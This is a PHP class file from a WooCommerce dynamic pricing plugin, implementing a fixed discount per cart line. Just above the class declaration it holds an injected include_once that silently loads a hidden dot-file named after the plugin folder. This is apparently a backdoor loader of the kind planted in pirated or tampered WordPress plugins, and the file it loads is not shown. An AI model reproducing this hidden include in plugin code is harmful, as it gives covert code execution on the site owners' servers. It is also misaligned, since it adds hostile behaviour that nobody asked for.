<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Load dependencies
if (!class_exists('RP_WCDPD_Pricing_Method_Discount_Per_Cart_Line')) {
    require_once('rp-wcdpd-pricing-method-discount-per-cart-line.class.php');
}

/**
 * Pricing Method: Discount Per Cart Line - Amount
 *
 * @class RP_WCDPD_Pricing_Method_Discount_Per_Cart_Line_Amount
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Pricing_Method_Discount_Per_Cart_Line_Amount extends RP_WCDPD_Pricing_Method_Discount_Per_Cart_Line
{

    protected $key      = 'amount';
    protected $contexts = array('cart_discounts_simple');
    protected $position = 10;

    // Singleton instance
    protected static $instance = false;

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {

        parent::__construct();

        $this->hook();
    }

    /**
     * Get label
     *
     * @access public
     * @return string
     */
    public function get_label()
    {
        return __('Fixed discount per cart line', 'rp_wcdpd');
    }

    /**
     * Calculate adjustment value
     *
     * @access public
     * @param float $setting
     * @param float $amount
     * @param array $adjustment
     * @return float
     */
    public function calculate($setting, $amount = 0, $adjustment = null)
    {
        // Get conditions
        $conditions = (is_array($adjustment) && !empty($adjustment['rule']['conditions'])) ? $adjustment['rule']['conditions'] : array();

        // Get cart item quantity to multiply by
        $quantity = RP_WCDPD_Controller_Conditions::get_sum_of_cart_item_quantities_by_product_conditions($conditions, true);

        // Calculate adjustment
        return -1 * RightPress_Help::get_amount_in_currency($setting, array('aelia', 'wpml')) * $quantity;

    }





}

RP_WCDPD_Pricing_Method_Discount_Per_Cart_Line_Amount::get_instance();
